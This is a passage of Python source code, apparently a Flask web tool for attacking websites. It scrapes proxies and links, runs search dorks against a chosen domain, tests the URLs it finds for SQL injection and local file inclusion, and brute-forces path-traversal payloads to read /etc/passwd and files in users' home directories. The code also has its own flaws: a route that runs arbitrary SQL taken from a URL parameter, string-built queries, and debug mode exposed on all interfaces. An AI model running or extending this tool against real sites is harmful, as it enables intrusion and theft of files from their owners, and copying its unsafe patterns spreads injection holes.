                port_passwd[k] = v
            else:
                pass

    for i in info:
        port_word = re.findall(r'\((\w+)\^', i[1])
        port_digital = ''
        for port_number in port_word:
            port_digital += port_passwd[port_number]
        found_proxy.append('{0}:{1}'.format(i[0], port_digital))
        if args.proxy:
            proxy_list.append('{0}:{1}'.format(i[0], port_digital))


@app.route("/proxy")
def proxy_scraper():
    global found_proxy
    found_proxy.clear()
    try:
        parse_proxy()
        for p in proxy_list:
            print(p)
    except Exception as e:
        print("Error: " + str(e))

    return render_template("tools.html", data=found_proxy, tool="Proxy scraper")


def href_parser(link):
    global links
    print("Scraping links from target: " + link)

    send = header_gen().request("GET", link, retries=Retry(3), timeout=Timeout(5))
    try:
        parsing = BeautifulSoup(send.data, features="html.parser")
    except Exception as ex:
        print("Error:\n" + str(ex) + "Trying latin-1...")
        parsing = BeautifulSoup(send.data.decode('latin-1'), features="html.parser")

    for href in parsing.find_all("a"):
        if str(href.get('href')) == "None":
            continue
        elif str(href.get('href')) == 'javascript:void(0)':
            continue
        elif str(href.get('href')) == '#':
            continue
        elif str(href.get('href')) == "#!":
            continue
        else:
            url = href.get('href')

            if not url.startswith("http"):
                if url.startswith("//"):
                    if str(url).split("//")[1] not in links:
                        print(str(url).split("//")[1])
                        links.append(str(url).split("//")[1])
                elif url.startswith("/"):
                    if link + str(url) not in links:
                        print(link + str(url))
                        links.append(link + str(url))
                else:
                    if (link + "/" + str(url)) not in links:
                        print(link + "/" + str(url))
                        links.append(link + "/" + str(url))
            else:
                print(str(url))
                if str(url) not in links:
                    links.append(url)


@app.route("/links")
def links_scan():
    global links
    site = request.args.get("url", default="none", type=str)
    links.clear()

    if site != "none":
        href_parser(site)

    return render_template("tools.html", data=links, tool="Links scraper")


@app.route("/specific_scan")
def specific_scan():
    global links, clean_links, links_buf
    site = request.args.get("url", default="none", type=str)
    links.clear()
    clean_links.clear()
    links_buf.clear()

    db = sqlite3.connect("dorker.db")
    sql = db.cursor()
    sql.execute('''CREATE TABLE IF NOT EXISTS vuln_urls (date_ TEXT, url_ TEXT PRIMARY KEY)''')
    db.commit()

    if site != "none":
        href_parser(site)
        domain = urlparse(site).netloc
        dorker("inurl:" + str(domain))
        # SELECT url_ FROM dorker_urls WHERE url_ LIKE '%=%'
        for url in sql.execute("""SELECT url_ from dorker_urls WHERE url_ LIKE '%""" + str(domain) + """%'"""):
            if "=" in url[0]:
                if url[0] not in links:
                    links.append(url[0])

        for link in links:
            splitter(link)

        links_buf.clear()

        for link in clean_links:
            connector(link)

        print("\nURLs that will be tested:\n")
        for link in links_buf:
            print(link)

        print("\nSQLi\n")
        pool = Pool(len(links_buf) // 2)
        pool.map(sqli_checker, links_buf)
        pool.close()
        pool.join()

        print("\nLFI\n")
        pool = Pool(len(links_buf) // 2)
        pool.map(lfi_checker, links_buf)
        pool.close()
        pool.join()

        print("\n\n\nDone!")

    return render_template("tools.html", data=sql.execute("""SELECT * from vuln_urls ORDER BY url_ DESC"""),
                           tool="Specific scan")


def dir_brute(url):
    print("Target: " + url)
    print("WORK IN PROGRESS")
    pass


@app.route("/directory_bruteforce")
def directory_bruteforce():
    url = request.args.get("url", default="none", type=str)

    if url != "none":
        dir_brute(url)

    return render_template("tools.html", data="WORK IN PROGRESS", tool="Directory bruteforce")


def lfi_brute(url):
    global lfi_brute_data
    try:
        req = header_gen().request("GET", url, retries=Retry(3), timeout=Timeout(5))
        if len(req.data) > 45:
            print("\nURL: " + url + "\nStatus: " + str(req.status) + "\nLength: " + str(len(req.data)))
            lfi_brute_data.append("URL: " + url + " status: " + str(req.status) + " length: " + str(len(req.data)))
    except Exception as ex:
        if "Max retries exceeded with url" in str(ex):
            print("[!] Max retries exceeded with URL: %s" % url)
        else:
            print("\n[!] Exception: " + str(ex) + "\n With URL: " + url)


@app.route("/lfi_bruteforce")
def lfi_bruteforce():
    global lfi_brute_data
    u = request.args.get("url", default="none", type=str)
    passwd_file = []
    passwd_file.clear()
    url_with_payloads = []
    url_with_payloads.clear()
    lfi_brute_data[:] = []

    if u != "none":
        url = u.split("PAYLOAD")
        print("\nLFI bruteforce\n")
        for exploit in lfi_payloads:
            print("Trying payload: " + exploit + "\nFor URL: " + url[0])
            try:
                if len(url) == 2 or len(url) >= 4:
                    req = header_gen().request("GET", url[0] + exploit, retries=Retry(3), timeout=Timeout(5))
                    try:
                        response = str(req.data.decode("utf-8"))
                    except Exception as ex:
                        if "codec can't decode byte" in str(ex):
                            response = str(req.data.decode("latin-1"))
                        else:
                            print("\n[!] Exception: " + str(ex) + "\n With URL: " + url[0])

                if "root:" in response:
                    passwd_file = re.findall(r".var.www.\w.+(?=:)|.home.\w.+(?=:)", response)
                    print(passwd_file)
                    print("Found working payload: " + exploit)
                    break

            except Exception as ex:
                if "Max retries exceeded with url" in str(ex):
                    print("[!] Max retries exceeded with URL: %s" % url)
                else:
                    print("\n[!] Exception: " + str(ex) + "\n With URL: " + url[0])

        # /etc/passwd
        if exploit == lfi_payloads[0]:
            if len(passwd_file) >= 1:
                for homedir in passwd_file:
                    for file in home_files:
                        if len(url) == 2 or len(url) >= 4:
                            url_with_payloads.append(url[0] + homedir + file)
            for file in lfi_fuzz:
                if len(url) == 2 or len(url) >= 4:
                    url_with_payloads.append(url[0] + file)

        # /etc/passwd%00
        elif exploit == lfi_payloads[1]:
            if len(passwd_file) >= 1:
                for homedir in passwd_file:
                    for file in home_files:
                        if len(url) == 2 or len(url) >= 4:
                            url_with_payloads.append(url[0] + homedir + file + "%00")
            for file in lfi_fuzz:
                if len(url) == 2 or len(url) >= 4:
                    url_with_payloads.append(url[0] + file + "%00")

        # lfi_payloads 2, 4, 5, 6, 7
        elif exploit == lfi_payloads[2] or exploit == lfi_payloads[4] or exploit == lfi_payloads[5] \
                or exploit == lfi_payloads[6] or exploit == lfi_payloads[7]:
            if len(passwd_file) >= 1:
                for homedir in passwd_file:
                    for file in home_files:
                        if len(url) == 2 or len(url) >= 4:
                            url_with_payloads.append(url[0] + exploit.split("/etc/passwd")[0] + homedir + file)
            for file in lfi_fuzz:
                if len(url) == 2 or len(url) >= 4:
                    url_with_payloads.append(url[0] + exploit.split("/etc/passwd")[0] + file)

        # ../../../../../../../../../../../../../../../../../etc/passwd%00
        elif exploit == lfi_payloads[3]:
            if len(passwd_file) >= 1:
                for homedir in passwd_file:
                    for file in home_files:
                        if len(url) == 2 or len(url) >= 4:
                            url_with_payloads.append(url[0] + exploit.split("/etc/passwd")[0] + homedir + file + "%00")
            for file in lfi_fuzz:
                if len(url) == 2 or len(url) >= 4:
                    url_with_payloads.append(url[0] + exploit.split("/etc/passwd")[0] + file + "%00")

        # %252e%252e%252f%252e%252e%252fetc%252fpasswd
        elif exploit == lfi_payloads[8]:
            if len(passwd_file) >= 1:
                for homedir in passwd_file:
                    for file in home_files:
                        if len(url) == 2 or len(url) >= 4:
                            url_with_payloads.append(url[0] + "252e%252e%252f%252e%252e"
                                                     + "%252f".join(homedir.split("/")) + file)
            for file in lfi_fuzz:
                if len(url) == 2 or len(url) >= 4:
                    url_with_payloads.append(url[0] + "%252e%252e" + "%252f".join(file.split("/")))

        # %252e%252e%252f%252e%252e%252fetc%252fpasswd%00
        elif exploit == lfi_payloads[9]:
            if len(passwd_file) >= 1:
                for homedir in passwd_file:
                    for file in home_files:
                        if len(url) == 2 or len(url) >= 4:
                            url_with_payloads.append(url[0] + "%252e%252e%252f%252e%252e"
                                                     + "%252f".join(homedir.split("/")) + file + "%00")
            for file in lfi_fuzz:
                if len(url) == 2 or len(url) >= 4:
                    url_with_payloads.append(url[0] + "%252e%252e" + "%252f".join(file.split("/")) + "%00")

        # ..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
        elif exploit == lfi_payloads[10]:
            if len(passwd_file) >= 1:
                for homedir in passwd_file:
                    for file in home_files:
                        if len(url) == 2 or len(url) >= 4:
                            url_with_payloads.append(url[0] + "..%c0%af..%c0%af..%c0%af"
                                                     + "%c0%af".join(homedir.split("/")) + file)
            for file in lfi_fuzz:
                if len(url) == 2 or len(url) >= 4:
                    url_with_payloads.append(url[0] + "..%c0%af..%c0%af..%c0%af" + "%c0%af".join(file.split("/")))

        pool = Pool(20)
        pool.map(lfi_brute, url_with_payloads)
        pool.close()
        pool.join()

    return render_template("tools.html", data=lfi_brute_data, tool="LFI bruteforce")


@app.route("/manage_db")
def manage_db():
    query = request.args.get("query", default="SELECT * from dorker_urls ORDER BY date_ DESC LIMIT 100", type=str)
    db = sqlite3.connect("dorker.db")
    sql = db.cursor()
    sql_data = sql.execute(query)

    return render_template("tools.html", data=sql_data, tool="Manage database")


@app.route("/download")
def download():
    table = request.args.get("table", default="dorker_urls", type=str)
    query = request.args.get("query", default="none", type=str)
    db = sqlite3.connect("dorker.db")
    sql = db.cursor()
    url_list.clear()

    if query != "none":
        for url in sql.execute(query):
            url_list.append(url[0] + "\n")
    else:
        for url in sql.execute("""SELECT url_ from """ + str(table)):
            url_list.append(url[0] + "\n")

    return Response(url_list, mimetype="text/plain", headers={"Content-Disposition": "attachment;filename=%s.txt" %
                                                                                     table})


@app.route("/")
@app.route("/index.html")
def index():
    sort_by = request.args.get("sort", default="date_", type=str)
    db = sqlite3.connect("dorker.db")
    sql = db.cursor()
    sql.execute('''CREATE TABLE IF NOT EXISTS dorker_urls (date_ TEXT, dork_ TEXT, url_ TEXT PRIMARY KEY)''')
    db.commit()

    return render_template("index.html", data=sql.execute('''SELECT * FROM dorker_urls ORDER BY %s DESC LIMIT 100''' %
                                                          sort_by))


if __name__ == '__main__':
    freeze_support()
    data = json.load(open("apps.json.py", "r"))

    try:
        lfi_fuzz = [file.split("\n")[0] for file in open("lfi_fuzz.txt", "r").readlines() if file not in lfi_fuzz]
    except Exception as exception:
        print("\n[!] Exception: " + str(exception))

    if args.proxy:
        try:
            proxy_list = [ip.split("\n")[0] for ip in open("proxy.txt", "r").readlines()]
            proxy_list = list(dict.fromkeys(proxy_list))
        except Exception as exception:
            print(str(exception))
            parse_proxy()

    app.run(debug=True, port=1337, use_reloader=False, host="0.0.0.0")
